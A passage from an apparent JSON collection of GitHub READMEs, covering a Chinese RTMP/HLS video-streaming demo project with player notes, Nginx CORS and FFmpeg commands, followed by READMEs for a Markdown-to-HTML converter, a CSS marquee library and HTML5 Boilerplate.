\u7528\u4e8e\u542c\uff0c\u62c9\u548c\u96c6\u5408\u6a21\u5f0f  \n* UDT \u7528\u4e8e\u542c\uff0c\u62c9\u548c\u96c6\u5408\u6a21\u5f0f  \n* HLS \u4e3a\u62c9\u6d41  \n###### :baby_chick: \u5355\u8def\u8def\u5b9e\u65f6\u7f16\u7801\u6d41\u4f20\u9012\uff08RTMP\uff09  \n![\u5355\u8def\u8def\u5b9e\u65f6\u7f16\u7801\u6d41\u4f20\u9012](\/Images\/live_streaming_big.png)\n###### :penguin: \u591a\u8def\u5b9e\u65f6\u7f16\u7801\u6d41\u4f20\u9012\uff08RTMP\uff09  \n![\u591a\u8def\u5b9e\u65f6\u7f16\u7801\u6d41\u4f20\u9012](\/Images\/rtmp-republishing_big.png)  \n\n######  :chicken: HLS\u3001MPEG-DASH\u591a\u8def\u8f93\u5165\/\u8f93\u51fa\u6d41   \n![Markdown](\/Images\/rtmp-republishing-hls-dash_big.png)  \n\n######  :hatched_chick: \u901a\u8fc7SSL\u52a0\u5bc6\u548c\u516c\u5f00HLS\u5a92\u4f53\u7684\u6765\u6e90\uff08HLS\uff09  \n![Markdown](\/Images\/http_restreaming_big.png)  \n\n##  :hibiscus: \u70b9\u64ad\u8bbe\u8ba1  \n![Markdown](\/Images\/vod-system.png)   \n\n## :four_leaf_clover: \u66f4\u65b0\u5217\u8868  \n* :eight: 2018\u5e7411\u670817\u65e5 \u661f\u671f\u4e94  \n  * [\u7f16\u89e3\u7801\u5668\u4e4b\u6218\uff1aAV1\u3001HEVC\u3001VP9\u548cVVC](https:\/\/mp.weixin.qq.com\/s\/HNDRciEZ-ldtrumbR68BmA)  \n  * [FFmpeg\u5728Intel GPU\u4e0a\u7684\u786c\u4ef6\u52a0\u901f\u4e0e\u4f18\u5316](https:\/\/mp.weixin.qq.com\/s\/VMbV_gf-IU5m3iUI6HyBMA)  \n  * [\u4e0b\u4e00\u4ee3\u4f4e\u5ef6\u65f6\u76f4\u64adCDN\uff1aHLS\u3001RTMP \u4e0eUDP +WebRTC](https:\/\/mp.weixin.qq.com\/s\/uAVDVkKbV2cGE_gLcLx4WA)  \n* :seven: 2018\u5e749\u670813\u65e5 \u661f\u671f\u56db  \n  * [RTMP\u76f4\u64ad\u5e94\u7528\u4e0e\u5ef6\u65f6\u5206\u6790](https:\/\/blog.csdn.net\/u014162133\/article\/details\/82256033)  \n  * [\u57fa\u4e8eRTMP\u6570\u636e\u4f20\u8f93\u534f\u8bae\u7684\u5b9e\u65f6\u6d41\u5a92\u4f53\u6280\u672f\u7814\u7a76](https:\/\/cloud.tencent.com\/developer\/article\/1199947)  \n  * [RTSP\u534f\u8bae\u8f6c\u6362RTMP\u76f4\u64ad\u534f\u8bae](https:\/\/www.jianshu.com\/p\/791963287067)  \n* :six: 2018\u5e748\u670831\u65e5 \u661f\u671f\u4e94   \n  * [\u81ea\u5b9a\u4e49\u97f3\u9891\u64ad\u653e\u5668\u7684\u5b9e\u73b0](https:\/\/hehuiyun.github.io\/2018\/07\/27\/%E8%87%AA%E5%AE%9A%E4%B9%89%E9%9F%B3%E9%A2%91%E6%92%AD%E6%94%BE%E5%99%A8%E7%9A%84%E5%AE%9E%E7%8E%B0\/#more)  \n  * [HLS-iOS\u89c6\u9891\u64ad\u653e\u670d\u52a1\u67b6\u6784\u6df1\u5165\u63a2\u7a76\uff08\u4e8c\uff09](https:\/\/yangchao0033.github.io\/blog\/2016\/02\/14\/hls-2\/)\n  * [HLS-iOS\u89c6\u9891\u64ad\u653e\u670d\u52a1\u67b6\u6784\u6df1\u5165\u63a2\u7a76\uff08\u4e00\uff09](https:\/\/yangchao0033.github.io\/blog\/2016\/01\/29\/hls-1\/)  \n  * [HTTP Live Streaming (HLS) - \u6982\u5ff5](https:\/\/www.jianshu.com\/p\/2ce402a485ca) \n* :five: 2018\u5e743\u670822\u65e5 \u661f\u671f\u4e94 \n  * [\u89c6\u9891\u63d2\u4ef6 video.js\u7684\u7528\u6cd5](http:\/\/www.jq22.com\/jquery-info404)  \n  * [\u89c6\u9891\u76f4\u64ad\u5e38\u89c1\u95ee\u9898\u4e0e\u89e3\u51b3\u529e\u6cd5\u6c47\u603b](https:\/\/yq.aliyun.com\/articles\/511196)  \n  * [\u5728Ubuntu 14.04\u4e0a\u5b89\u88c5Nginx-RTMP](https:\/\/www.vultr.com\/docs\/setup-nginx-rtmp-on-ubuntu-14-04)  \n* :four: 2018\u5e741\u670816\u65e5 \u661f\u671f\u4e8c [\u97f3\u89c6\u9891\u89e3\u51b3\u65b9\u6848 NGINX-RTMP-TS-DASH](https:\/\/github.com\/Tinywan\/NGINX-RTMP-TS-DASH)  \n* :three: 2017\u5e7404\u670818\u65e5 \u661f\u671f\u4e8c [\u89e3\u51b3VideoJs\u963f\u91cc\u4e91\u76f4\u64ad\u548c\u70b9\u64ad\u8de8\u57df\u95ee\u9898](http:\/\/www.cnblogs.com\/tinywan\/p\/6234463.html)\n* :two: 2017\u5e7406\u670806\u65e5 \u661f\u671f\u4e8c \u5f00\u6e90\u7684\u64ad\u653e\u5668  \n  * :computer: [Aliplayer \u64ad\u653e\u5668](https:\/\/player.alicdn.com\/aliplayer\/index.html)\n  * :computer: [Video-dev-Hls \u64ad\u653e\u5668 ](https:\/\/github.com\/video-dev\/hls.js)  \n  * :computer: [ Sewise-Player \u64ad\u653e\u5668](https:\/\/github.com\/jackzhang1204\/sewise-player)  \n  * :computer: [clappr \u64ad\u653e\u5668](https:\/\/github.com\/clappr\/clappr)   \n    *  \u652f\u6301\u683c\u5f0f\uff1a`hls, dash, ogg, webm, mp4, rtmp either live or video on demand`   \n    *  :computer:  [\u5728\u7ebf\u9884\u89c8](http:\/\/github.tinywan.com\/html5-dash-hls-rtmp\/clappr\/index1.html)  \n  * [mediaelement player \u64ad\u653e\u5668](https:\/\/github.com\/mediaelement\/mediaelement)  \n    * \u652f\u6301\u683c\u5f0f\uff1a`\u652f\u6301MP4\uff0cWebM\u548cMP3\u4ee5\u53caHLS\uff0cDash\uff0cYouTube\uff0cFacebook\uff0cSoundCloud\u548c\u5176\u4ed6HTML5 MediaElement API\u7684HTML5 <audio>\u6216<video>\u64ad\u653e\u5668\uff0c\u53ef\u5728\u6240\u6709\u6d4f\u89c8\u5668\u4e2d\u5b9e\u73b0\u4e00\u81f4\u7684UI`  \n    * :computer:  [\u5728\u7ebf\u9884\u89c8](http:\/\/github.tinywan.com\/html5-dash-hls-rtmp\/MediaElement\/index1.html)  \n* :one: 2017\u5e7406\u670807\u65e5 \u661f\u671f\u4e09 Play-RTMP-HLS-Stream \u4ee3\u7801\u65b9\u6cd5\u4f18\u5316\n###  :tomato:  \u76f4\u64ad\u6e90  \n+ \u00a0HLS-001\uff1a`http:\/\/hls-live.jia.360.cn\/live_jia_public\/_LC_RE_non_3605277091515101384821337866_BX\/index.m3u8`\n+   \u9999\u6e2f\u536b\u89c6&emsp;`http:\/\/live.hkstv.hk.lxdns.com\/live\/hks\/playlist.m3u8`\n+   CCTV1\u9ad8\u6e05&emsp;`http:\/\/ivi.bupt.edu.cn\/hls\/cctv1hd.m3u8`\n+   CCTV5\u9ad8\u6e05&emsp;`http:\/\/ivi.bupt.edu.cn\/hls\/cctv5hd.m3u8`\n+   \u676d\u5eb7&emsp;`http:\/\/live.hkstv.hk.lxdns.com\/live\/hks\/playlist.m3u8`\n### :tropical_fish: \u8be6\u7ec6\u4ecb\u7ecd  \n+   \u4ee5\u4e0b\u6d4b\u8bd5\u5ef6\u8fdf\u591a\u4e3a\u5c40\u57df\u7f51\u6d4b\u8bd5\u73af\u5883\uff08\u7ebf\u4e0a\u4e3a\u963f\u91cc\u4e91\u5e73\u53f0\u6d4b\u8bd5\uff09  \n+   M3U8 \u76f4\u64ad\u6216\u8005\u70b9\u64adDEMO  \n### :sunny: VideoJs-M3U8\n+ [x] 1\u3001\u652f\u6301\u76f4\u64ad\u6d41\uff1aHSL\u7684 m3u8   \n+ [x] 2\u3001\u5982\u4f55\u4f7f\u7528\uff1a\u76f4\u63a5\u4e0b\u8f7d\u5373\u53ef\u4f7f\u7528,\u6ce8\u610f\u70b9\uff1a m3u8 \u64ad\u653e\u5fc5\u987b\u653e\u5728\u670d\u52a1\u5668\u4e0b\u9762  \n+ [x] 3\u3001\u9ed8\u8ba4\uff1am3u8\u64ad\u653e   \n+ [x] 4\u3001\u5ef6\u8fdf\u6d4b\u8bd5(\u5c40\u57df\u7f51\u6d4b\u8bd5)\n     + [x] RTMP \u5ef6\u8fdf\uff1a2s   \n     + [x] HLS \u5ef6\u8fdf\uff1a 18s \n     + [x] VLC \u5ef6\u8fdf(\u4e0d\u63a8\u8350)\uff1a 18s  \n+ [x] 5\u3001\u9274\u6743\uff1a\u53ef\u4ee5      \n+ [x] \u76ae\u80a4\u652f\u6301\n    + [\u5b98\u65b9\u76ae\u80a4](http:\/\/www.scriptsmashup.com\/Video_Skin_Generator\/Videojs\/videojs-skin-generator.html)\n    + YouTouBe\n    ![YouTouBe](\/Images\/YouTouBe.jpg)\n    + facebook-player   \n    ![facebook-player](\/Images\/facebook.jpg)\n### :cloud: m3u8-IE-Support \n+ [x] \u517c\u5bb9\u6240\u6709\u6d4f\u89c8\u5668\n+ [x] \u652f\u6301IE11 \u6d4f\u89c8\u5668\u64ad\u653e  \n+ [x] \u6d4b\u8bd5\u7ed3\u679c\uff1a\u901a\u8fc7 \n### :cyclone:   VideoJs2017\n+ [x] 1\u3001RTMP \u652f\u6301\u64ad\u653e\n+ [x] 2\u3001\u652f\u6301\u9274\u6743 \n+ [ ] 3\u3001~~M3U8 IE \u6682\u65f6\u4e0d\u652f\u6301\u64ad\u653e~~  \n+ [x] 4\u3001\u5ef6\u8fdf\u6d4b\u8bd5(\u5c40\u57df\u7f51\u6d4b\u8bd5)\n    + [x] RTMP \u5ef6\u8fdf\uff1a2s   \n    + [x] HLS \u5ef6\u8fdf\uff1a 18s \n    + [x] VLC \u5ef6\u8fdf(\u4e0d\u63a8\u8350)\uff1a 18s \n+ \u6d4b\u8bd5\u64ad\u653e\u5217\u8868\n     + [1] RTMP\u76f4\u64ad\u6d41\uff1a`rtmp-stream.html`\n     + [2] HLS\u76f4\u64ad\u548c\u70b9\u64ad\uff1a`hls-stream.html`\n     + [3] \u76f4\u64ad\u548c\u70b9\u64adHLS\u7684M3U8\u64ad\u653e(\u53ef\u8f93\u5165\u52a8\u6001\u6539\u53d8HLS\u5730\u5740)\uff1a`auto-input-hls-player.html`\n        + \u9047\u5230JS\u8de8\u57df\u7684\u95ee\u9898\uff1a\n            - `The value of the 'Access-Control-Allow-Origin' header in the response must not be the wildcard '*' when the request's credentials mode is 'include'. Origin 'http:\/\/127.0.0.1`\n        + \u89e3\u51b3\u529e\u6cd5(Nginx \u670d\u52a1\u5668\u914d\u7f6e\u65b9\u6cd5\uff0cApache\u81ea\u884c\u767e\u5ea6)\uff1a\n        ```\n        location \/record {\n            add_header Cache-Control no-cache;\n            add_header 'Access-Control-Allow-Origin' '*' always;\n            add_header 'Access-Control-Expose-Headers' 'Content-Length,Content-Range';\n            add_header 'Access-Control-Allow-Headers' 'Range';\n            types{\n                    application\/dash+xml mpd;\n                    application\/vnd.apple.mpegurl m3u8;\n                    video\/mp2t ts;\n             }\n            alias \/home\/tinywan\/hls;\n         }\n\n        ```\n        + \u6d4b\u8bd5\u5730\u5740\uff1a`http:\/\/192.168.18.143\/record\/stream_name\/index.m3u8`\n+ [x] \u6d4b\u8bd5\u8fdb\u5ea6\n    + [2017\u5e744\u670810\u65e5 \u4e0b\u5348 16:00 ] \u5c40\u57df\u7f51\u7684HSL\u548cRTMP\u6d41\u5ef6\u8fdf\u7684\u6d4b\u8bd5\n        > \u6d4b\u8bd5\u7ed3\u679c\uff1aRTMP \u5ef6\u8fdf\uff1a2s \uff0cHLS \u5ef6\u8fdf\uff1a 18s    \n    + [2017\u5e744\u670811\u65e5 \u4e0b\u5348 13:00 ] \u76f4\u64ad\u548c\u70b9\u64adHLS\u7684M3U8\u64ad\u653e(\u53ef\u8f93\u5165\u52a8\u6001\u6539\u53d8HLS\u5730\u5740),JS \u8de8\u57df\u95ee\u9898    \n\n#### :umbrella: Play-RTMP-HLS-Stream(Obj-Flash) \n+   \u652f\u6301 RTMP \u548c M3U8 \u76f4\u64ad\u517c\u5bb9\u64ad\u653e\n+   \u53c2\u6570\u8bf4\u660e\n    +   \u8bed\u6cd5\uff1a`embedSWF: function(swfUrlStr, replaceElemIdStr, widthStr, heightStr, swfVersionStr, xiSwfUrlStr, flashvarsObj, parObj, attObj, callbackFn)`\n        1.  `swfUrlStr`:\u6307\u5b9a\u60a8\u7684SWF\u7684URL\uff08StrobeMediaPlayback.swf\uff09\n        1.  `replaceElemIdStr`:\u6307\u5b9a\u5305\u542b\u66ff\u6362\u5143\u7d20\u7684html\u5143\u7d20\u7684ID,\u80fd\u7528\u4f60\u7684flash\u7684\u5185\u5bb9\u6765\u66ff\u6362\n        1.  `widthStr`:\u6307\u5b9aSWF\u7684\u5bbd\u5ea6\n        1.  `heightStr`:\u6307\u5b9aSWF\u7684\u9ad8\u5ea6\n        1.  `swfVersionStr`:\u6307\u5b9aSWF \u53d1\u5e03\u6240\u9700\u7684flash\u64ad\u653e\u5668\u7684\u7248\u672c\n        1.  `xiSwfUrlStr`:\u6307\u5b9a\u5feb\u901f\u5b89\u88c5\u7684\u8def\u5f84\uff0c\u6fc0\u6d3b\u5feb\u901f\u5b89\u88c5. \u8bf7\u6ce8\u610f\uff0c\u5feb\u901f\u5b89\u88c5\u53ea\u4f1a\u89e6\u53d1\u4e00\u6b21\uff08\u4ed6\u7b2c\u4e00\u6b21\u88ab\u8c03\u7528\uff09\n        1.  `flashvarsObj`:\u6307\u5b9a\u9700\u8981\u4f20\u9012\u7ed9flash\u7684\u53d8\u91cf\uff08\u7528\u952e\u503c\u5bf9\uff09\n        1.  `parObj`:\u6307\u5b9a\u5d4c\u5165\u5bf9\u8c61\u7684\u53c2\u6570\uff08\u7528\u952e\u503c\u5bf9\uff09\n        1.  `attObj`:\u6307\u5b9a\u5bf9\u8c61\u7684\u5c5e\u6027\uff08\u7528\u952e\u503c\u5bf9\uff09\n        1.  `callbackFn`: (JavaScript function, optional)\u80fd\u5b9a\u4e49\u4e00\u4e2a\u56de\u8c03\u51fd\u6570\uff0c\u4e0d\u7ba1\u8c03\u7528flash\u521b\u5efa\u6210\u529f\u6216\u8005\u5931\u8d25\u90fd\u53ef\u4ee5\u8c03\u7528\u8be5\u51fd\u6570\n+   \u6587\u6863\n    + [x] 1\u3001\u652f\u6301\uff1a\u64ad\u653eRTMP\u76f4\u64ad\u6d41\u548cHSL\u76f4\u64ad\u6d41   \n    + [x] 2\u3001\u5982\u4f55\u4f7f\u7528\uff1a\u76f4\u63a5\u4e0b\u8f7d\u5373\u53ef\u4f7f\u7528,\u6ce8\u610f\u70b9\uff1am3u8 \u64ad\u653e\u5fc5\u987b\u653e\u5728\u670d\u52a1\u5668\u4e0b\u9762\uff0c\u8d1f\u8f7d\u5b58\u5728\u8de8\u57df\u95ee\u9898  \n    + [x] 3\u3001\u9ed8\u8ba4\uff1aRTMP\u64ad\u653e   \n    + [x] 4\u3001\u5ef6\u8fdf\uff1a\n        + [x] RTMP \u5ef6\u8fdf\uff1a3s   \n        + [x] HLS \u5ef6\u8fdf\uff1a 20s  \n    + [x] 5\u3001\u8de8\u57df\uff1aOK\n    + [x] 6\u3001\u9274\u6743\uff1aOK \uff08\u670d\u52a1\u6dfb\u52a0xml\u8de8\u57df\u6587\u4ef6\uff09\n    + [x] 7\u3001\u5f85\u89e3\u51b3\u95ee\u9898\uff1ajs \u8c03\u7528swf\u95ee\u9898~~~~~~~~~~~\n    + [x] \u6d4b\u8bd5\u8fdb\u5ea6\n        + [2017\u5e744\u670810\u65e5 \u4e0b\u5348 16:00 ] \u5c40\u57df\u7f51\u7684HSL\u548cRTMP\u6d41\u5ef6\u8fdf\u7684\u6d4b\u8bd5\uff0c\u6d4b\u8bd5\u7ed3\u679c\uff1aRTMP \u5ef6\u8fdf\uff1a3s \uff0cHLS \u5ef6\u8fdf\uff1a 20s \n        + [2017\u5e746\u67087\u65e5 \u4e0b\u5348 16:00 ] \u4ee3\u7801\u4f18\u5316,\u8be5\u9875\u9762\u8fdb\u884c\u8fc7\u4f18\u5316`play2video2.html`\uff0c\u9ed8\u8ba4\u9759\u97f3\u64ad\u653e  \n\n## :apple: \u97f3\u9891\u548c\u89c6\u9891\u6280\u672f\u6587\u6863\n* [HLS-iOS\u89c6\u9891\u64ad\u653e\u670d\u52a1\u67b6\u6784\u6df1\u5165\u63a2\u7a76\uff08\u4e8c\uff09](https:\/\/yangchao0033.github.io\/blog\/2016\/02\/14\/hls-2\/)\n* [HLS-iOS\u89c6\u9891\u64ad\u653e\u670d\u52a1\u67b6\u6784\u6df1\u5165\u63a2\u7a76\uff08\u4e00\uff09](https:\/\/yangchao0033.github.io\/blog\/2016\/01\/29\/hls-1\/)  \n* [HTTP Live Streaming (HLS) - \u6982\u5ff5](https:\/\/www.jianshu.com\/p\/2ce402a485ca)  \n* \u670d\u52a1\u5668\u7aef\u6d41\u5a92\u4f53\u6280\u672f\n  * [GStreamer](https:\/\/gstreamer.freedesktop.org\/)  \n  * [Nginx RTMP\u6a21\u5757](https:\/\/github.com\/arut\/nginx-rtmp-module)  \n  * [SHOUTcast](http:\/\/en.wikipedia.org\/wiki\/SHOUTcast)\n+   [\u4e3a HTML 5 \u89c6\u9891\u63d0\u4f9b\u7684 DASH \u81ea\u9002\u5e94\u4e32\u6d41](https:\/\/developer.mozilla.org\/zh-CN\/docs\/Web\/HTML\/DASH_Adaptive_Streaming_for_HTML_5_Video)    \n+   [HTTP\u8bbf\u95ee\u63a7\u5236\uff08CORS\uff09](https:\/\/developer.mozilla.org\/zh-CN\/docs\/Web\/HTTP\/Access_control_CORS)\n+   [\u4f7f\u7528 canvas \u5904\u7406\u89c6\u9891](https:\/\/developer.mozilla.org\/zh-CN\/docs\/Web\/API\/Canvas_API\/Manipulating_video_using_canvas)\n+   [\u97f3\u9891\u548c\u89c6\u9891\u5185\u5bb9](https:\/\/developer.mozilla.org\/zh-CN\/docs\/Learn\/HTML\/Multimedia_and_embedding\/Video_and_audio_content)\n+   [\u57fa\u4e8eHTTP\u7684\u52a8\u6001\u81ea\u9002\u5e94\u6d41\u5a92\u4f53](https:\/\/en.wikipedia.org\/wiki\/Dynamic_Adaptive_Streaming_over_HTTP)       \n+   [P2P\u5982\u4f55\u5c06\u89c6\u9891\u76f4\u64ad\u5e26\u5bbd\u964d\u4f4e75%\uff1f](http:\/\/mp.weixin.qq.com\/s\/ryojkLRb1x02pr0KSFzP9Q)       \n+   [\u5c55\u671b2018\u97f3\u89c6\u9891\u6280\u672f\uff1aAV1\uff0cAI\uff0c\u533a\u5757\u94fe\uff0cWebRTC](http:\/\/mp.weixin.qq.com\/s\/lX9WWqSS0KGQddrOVqV-Jg)       \n+   [\u600e\u4e48\u8ba9\u4e0d\u53ef\u9760\u7684UDP\u53ef\u9760\uff1f](http:\/\/mp.weixin.qq.com\/s\/-yJH782XEnaezr7NWu8lIw)        \n+   [Twitch\u5982\u4f55\u5b9e\u73b0\u8f6c\u7801\u5668\u6bd4FFmepg\u6027\u80fd\u63d0\u534765%\uff1f\uff08\u4e0a\uff09](http:\/\/mp.weixin.qq.com\/s\/F7BBKM5heMu6EN705N504A)        \n+   [Twitch\u5982\u4f55\u5b9e\u73b0\u8f6c\u7801\u5668\u6bd4FFmpeg\u6027\u80fd\u63d0\u534765%\uff1f\uff08\u4e0b\uff09](http:\/\/mp.weixin.qq.com\/s\/BCMLzV9MlOjsnHzzfkTKkA)     \n  \n## :melon: FFmpeg HLS \u547d\u4ee4\u8bb0\u5f55\n+   [https:\/\/github.com\/video-dev\/hls.js](https:\/\/github.com\/video-dev\/hls.js)\n+   [\u5b98\u65b9\u6587\u6863http:\/\/www.ffmpeg.org\/ffmpeg-formats.html](http:\/\/www.ffmpeg.org\/ffmpeg-formats.html)\n+   `hls_segment_filename` \u6587\u4ef6\u540d\n    +   \u8bbe\u7f6e\u6bb5\u6587\u4ef6\u540d\u3002\u9664\u975ehls_flags single_file\u8bbe\u7f6e\uff0c \u6587\u4ef6\u540d\u5c06\u88ab\u7528\u4f5c\u5177\u6709\u6bb5\u53f7\u7684\u5b57\u7b26\u4e32\u683c\u5f0f\uff1a\n    +   \u683c\u5f0f\uff1a`ffmpeg -i in.nut -hls_segment_filename'file\uff0503d.ts'out.m3u8`\n    +   \u6b64\u793a\u4f8b\u5c06\u751f\u6210\u64ad\u653e\u5217\u8868\uff0c out.m3u8\uff0c\u548c\u6bb5\u6587\u4ef6\uff1a file000.ts\uff0c file001.ts\uff0c file002.ts\u7b49\u7b49\n+   `use_localtime` \u6587\u4ef6\u540d\n    +   \u5bf9\u6587\u4ef6\u540d\u4f7f\u7528strftime\uff08\uff09\u6765\u6269\u5c55\u672c\u5730\u65f6\u95f4\u6bb5\u7684\u6587\u4ef6\u540d\u3002\u6bb5\u53f7\u4e5f\u53ef\u5728\u6b64\u6a21\u5f0f\u4e0b\u4f7f\u7528\uff0c\u4f46\u8981\u4f7f\u7528\u5b83\uff0c\u60a8\u9700\u8981\u6307\u5b9asecond_level_segment_index hls_flag\uff0c\u800c%% d\u5c06\u662f\u8bf4\u660e\u7b26\u3002\n    +   \u683c\u5f0f\uff1a`ffmpeg -i in.nut -use_localtime 1 -hls_segment_filename'file-\uff05Y\uff05m\uff05d-\uff05s.ts'out.m3u8`\n    +   \u6b64\u793a\u4f8b\u5c06\u751f\u6210\u64ad\u653e\u5217\u8868\uff0c out.m3u8\uff0c\u548c\u6bb5\u6587\u4ef6\uff1a \u6587\u4ef620160215-1455569023.ts\uff0c \u6587\u4ef620160215-1455569024.ts\u7b49\u7b49\u3002\u6ce8\u610f\uff1a\u5728\u67d0\u4e9b\u7cfb\u7edf\/\u73af\u5883\u4e2d\uff0c\u8bf4\u660e%s\u7b26\u4e0d\u53ef\u7528\u3002\u89c1 strftime()\u6587\u4ef6\u3002\n+   ts \u6587\u4ef6\u8f6c\u6362\u6210m3u8\u6587\u4ef6:`ffmpeg -i 854-1496985395500.ts -c copy -map 0 -f segment -segment_list playlist.m3u8 -segment_time 10 output%03d.ts`        \n+   \u7801\u4e91\u63d0\u4ea4\u4ee3\u7801==Github \u540c\u6b65diamante     \n"},{"repo":"\/Nilhcem\/markdown2html","language":"Java","readme_contents":"Markdown2HTML\n=============\n\nAn extremely simple Markdown to HTML converter,\npowered by [MarkdownJ](http:\/\/code.google.com\/p\/markdownj\/).\n\nAvailable in command line and GUI mode.\n\nIt is licensed under the BSD license.\n\n\nRequirements\n------------\n\nYou need Java JVM 1.6 or newer installed on your machine.\n\n\nUsage\n-----\n\n### GUI version ###\n\n`java -jar Markdown2HTML.jar`\n\n### Command line version ###\n\n`java -jar Markdown2HTML.jar markdownFile [- header headerFile.html] [-footer footerFile.html] [-out [file.html]]`\n\n#### Options for the command line version ####\n\n- `markdownFile`: the text file which will be converted (compulsory field).\n- `-header headerFile.html`: the path of an existing HTML header file.\nIts content will be prepended to the converted `markdownFile` file.\n- `-footer footerFile.html`: the path of an existing HTML footer file.\nIts content will be appended to the converted `markdownFile` file.\n- `-out`: enter this to specify that the program should create a new file\nwhich contains the same name as the `markdownFile`, with the .html extension.\n- `-out file.html`: enter this to specify the name of the converted file.\n\n\nGUI Screenshot\n--------------\n\n<img src=\"https:\/\/raw.githubusercontent.com\/Nilhcem\/markdown2html\/master\/screenshot.png\" width=\"814\" height=\"564\" \/>\n\n\nBuilding it\n-----------\n\n`mvn package`, that's all!\n"},{"repo":"\/muchweb\/html5-marquee","language":"CSS","readme_contents":"# HTML5 MARQUEE [![npm version](https:\/\/badge.fury.io\/js\/html5-marquee.svg)](http:\/\/badge.fury.io\/js\/html5-marquee)\n\n<p align=\"center\"><img alt=\"HTML5 marquee logo\" src=\"logo\/logo.png\" \/><\/p>\n\n>Are you missing good-old feel to your pages? Missing something form the past?\n\nThis is a (deprecated) `<marquee><\/marquee>` tag implementation in HTML5 using pure CSS3 animations. Please see [**live demo here**](http:\/\/muchweb.github.io\/html5-marquee\/).\n\n## Installation\n\n- Bower: `bower install html5-marquee`\n- NPM: `npm install html5-marquee`\n\n## Usage\n\n### Simple usage:\n\n```html\n<div class=\"marquee\" data-marquee=\"Text contents\"><\/div>\n```\n\n### Adjust marquee speed:\n\n|CSS Class|Delay|\n|:---:|:---:|\n|`.marquee-speed-drowsy`|`30s`|\n|`.marquee-speed-slow`|`20s`|\n|`.marquee-speed-normal`|`10s` (default)|\n|`.marquee-speed-fast`|`7s`|\n|`.marquee-speed-swift`|`5s`|\n|`.marquee-speed-hyper`|`2s`|\n\n#### Custom speed:\n\nInherits the speed from the class or inline style\n\n|CSS Class|Delay|\n|:---:|:---:|\n|`.marquee-speed-custom`|`inherit`|\n\n### Adjust direction:\n\n|CSS Class||\n|:---:|:---:|\n|`.marquee-direction-left`|Right to left (default)|\n|`.marquee-direction-right`|Left to right|\n|`.marquee-direction-alternate`|Alternate movement|\n\n### Adjust direction:\n\n|CSS Class||\n|:---:|:---:|\n|`.marquee-direction-left`|Right to left (default)|\n|`.marquee-direction-right`|Left to right|\n|`.marquee-direction-alternate`|Alternate movement|\n\n### Vintage effect:\n\n|CSS Class||\n|:---:|:---:|\n|`.marquee-movement-smooth`|Smooth animation (default)|\n|`.marquee-movement-steps20`|Jamming animation|\n|`.marquee-movement-steps10`|Jamming animation|\n\n## Building\n\nRequirements:\n\n - Node.js\n - NPM\n - GNU Make\n\n```bash\nmake\n```\n\nThis will create `css` directory.\n\n## Free license: [GNU GPLv3+](.\/LICENSE)\n\nThis program is free software: you can redistribute it and\/or modify it under the terms of the GNU General Public License as published by the Free Software Foundation, either version 3 of the License, or (at your option) any later version.\n\nThis program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU General Public License for more details.\n\nYou should have received a copy of the GNU General Public License along with this program.  If not, see <http:\/\/www.gnu.org\/licenses\/>.\n"},{"repo":"\/h5bp\/html5-boilerplate","language":"JavaScript","readme_contents":"# [HTML5 Boilerplate](https:\/\/html5boilerplate.com\/)\n\n[![LICENSE](https:\/\/img.shields.io\/badge\/license-MIT-lightgrey.svg)](https:\/\/github.com\/h5bp\/html5-boilerplate\/blob\/master\/LICENSE.txt)\n[![Build Status](https:\/\/travis-ci.org\/h5bp\/html5-boilerplate.svg)](https:\/\/travis-ci.org\/h5bp\/html5-boilerplate)\n[![devDependency Status](https:\/\/david-dm.org\/h5bp\/html5-boilerplate\/dev-status.svg)](https:\/\/david-dm.org\/h5bp\/html5-boilerplate#info=devDependencies)\n[![NPM Downloads](https:\/\/img.shields.io\/npm\/dt\/html5-boilerplate.svg)](https:\/\/www.npmjs.com\/package\/html5-boilerplate)\n[![github-stars-image](https:\/\/img.shields.io\/github\/stars\/h5bp\/html5-boilerplate.svg?label=github%20stars)](https:\/\/github.com\/h5bp\/html5-boilerplate)\n\nHTML5 Boilerplate is a professional front-end template for building\nfast, robust, and adaptable web apps or sites.\n\nThis project is the product of years of iterative development and\ncommunity knowledge. It does not impose a specific development\nphilosophy or framework, so you're free to architect your code in the\nway that you want.\n\n* Homepage: [https:\/\/html5boilerplate.com\/](https:\/\/html5boilerplate.com\/)\n* Source: [https:\/\/github.com\/h5bp\/html5-boilerplate](https:\/\/github.com\/h5bp\/html5-boilerplate)\n* Twitter: [@h5bp](https:\/\/twitter.com\/h5bp)\n\n\n## Quick start\n\nChoose one of the following options:\n\n* Download the latest stable release from\n  [html5boilerplate.com](https:\/\/html5boilerplate.com\/). This zip file is a snapshot of the `dist` folder. On Windows, Mac and from the file manager on Linux unzipping this folder will output to a folder named something like `html5-boilerplate_v7.3.0`. From the command line will need to create a folder and unzip the contents into that folder.\n\n  ```bash\n  mkdir html5-boilerplate\n  unzip html5-boilerplate*.zip -d html5-boilerplate\n  ```\n\n* Clone the git repo \u2014 `git clone\n  https:\/\/github.com\/h5bp\/html5-boilerplate.git` - and checkout the\n  [tagged release](https:\/\/github.com\/h5bp\/html5-boilerplate\/releases)\n  you'd like to use. The `dist` folder represents the latest version of the project for end users. \n* Install with [npm](https:\/\/www.npmjs.com\/): `npm install html5-boilerplate` or [yarn](https:\/\/yarnpkg.com\/): `yarn add html5-boilerplate`. The resulting `node_modules\/html5-boilerplate\/dist` folder represents the latest version of the project for end users. Depending on what you want to use and how you want to use it, you may have to copy and paste the contents of that folder into your project directory.\n\n## Features\n\n* HTML5 ready. Use the new elements with confidence.\n* Designed with progressive enhancement in mind.\n* Includes:\n  * [`Normalize.css`](https:\/\/necolas.github.com\/normalize.css\/)\n    for CSS normalizations and common bug fixes\n  * [`jQuery`](https:\/\/jquery.com\/) via CDN with [SRI Hash](https:\/\/developer.mozilla.org\/en-US\/docs\/Web\/Security\/Subresource_Integrity) and a local fallback\n  * A custom build of [`Modernizr`](https:\/\/modernizr.com\/) for feature\n    detection\n  * [`Apache Server Configs`](https:\/\/github.com\/h5bp\/server-configs-apache)\n    that, among other, improve the web site's performance and security\n* Placeholder CSS Media Queries.\n* Useful CSS helper classes.\n* Default print styles, performance optimized.\n* An optimized version of the Google Universal Analytics snippet.\n* Protection against any stray `console` statements causing JavaScript\n  errors in older browsers.\n* \"Delete-key friendly.\" Easy to strip out parts you don't need.\n* Extensive inline and accompanying documentation.\n\n\n## Browser support\n\n* Chrome *(latest 2)*\n* Edge *(latest 2)*\n* Firefox *(latest 2)*\n* Internet Explorer 11\n* Opera *(latest 2)*\n* Safari *(latest 